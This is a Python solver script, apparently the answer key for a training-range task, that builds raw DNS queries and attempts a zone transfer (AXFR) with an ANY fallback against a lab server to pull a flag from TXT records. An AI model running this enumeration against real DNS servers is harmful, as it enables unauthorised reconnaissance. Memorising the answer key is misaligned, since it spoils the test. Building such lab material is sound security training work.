"""Intended-path solver: minimal DNS client over UDP, AXFR then ANY."""

import socket
import struct
import urllib.parse

from openrange.content.solver import SolveResult, TaskResult, find_flags

QTYPE_TXT = 16
QTYPE_A = 1
QTYPE_AXFR = 252
QTYPE_ANY = 255


def _build_query(name: str, qtype: int, query_id: int) -> bytes:
    labels = b"".join(bytes([len(part)]) + part.encode() for part in name.rstrip(".").split("."))
    header = struct.pack(">HHHHHH", query_id, 0x0100, 1, 0, 0, 0)
    return header + labels + b"\x00" + struct.pack(">HH", qtype, 1)


def _skip_name(message: bytes, offset: int) -> int:
    while True:
        length = message[offset]
        if length == 0:
            return offset + 1
        if length & 0xC0 == 0xC0:
            return offset + 2
        offset += 1 + length


def _parse_answer_texts(message: bytes) -> list[str]:
    _ident, _flags, qdcount, ancount, _ns, _ar = struct.unpack_from(">HHHHHH", message)
    texts: list[str] = []
    offset = 12
    for _ in range(qdcount):
        offset = _skip_name(message, offset) + 4
    for _ in range(ancount):
        offset = _skip_name(message, offset)
        rtype, _rclass, _ttl, rdlength = struct.unpack_from(">HHIH", message, offset)
        offset += 10
        rdata = message[offset : offset + rdlength]
        offset += rdlength
        if rtype != QTYPE_TXT:
            continue
        position = 0
        chunks: list[str] = []
        while position < len(rdata):
            size = rdata[position]
            chunks.append(rdata[position + 1 : position + 1 + size].decode(errors="replace"))
            position += 1 + size
        texts.extend(chunks)
    return texts


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host = urllib.parse.urlsplit(ctx.url("target")).hostname or "target"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    notes: list[str] = []
    texts: list[str] = []

    # Breadcrumbs first: confirm the server answers ordinary queries.
    for name, qtype in (("portal.lab.internal", QTYPE_A), ("flag.lab.internal", QTYPE_ANY)):
        sock.sendto(_build_query(name, qtype, 0x1337), (host, 53))
        try:
            data, _addr = sock.recvfrom(4096)
            notes.append(f"{name} type {qtype}: {len(data)}B reply")
        except socket.timeout:
            notes.append(f"{name} timed out")

    # Intended path: zone transfer, then ANY fallback.
    for qtype in (QTYPE_AXFR, QTYPE_ANY):
        sock.sendto(_build_query("lab.internal", qtype, 0x2A2B), (host, 53))
        try:
            data, _addr = sock.recvfrom(8192)
        except socket.timeout:
            continue
        texts.extend(_parse_answer_texts(data))
        if texts:
            break
    sock.close()

    flags = find_flags("\n".join(texts)) if texts else []
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="follow-the-records",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"no TXT flag via AXFR/ANY; probes: {'; '.join(notes)[:200]}",
            )
        ]
    )
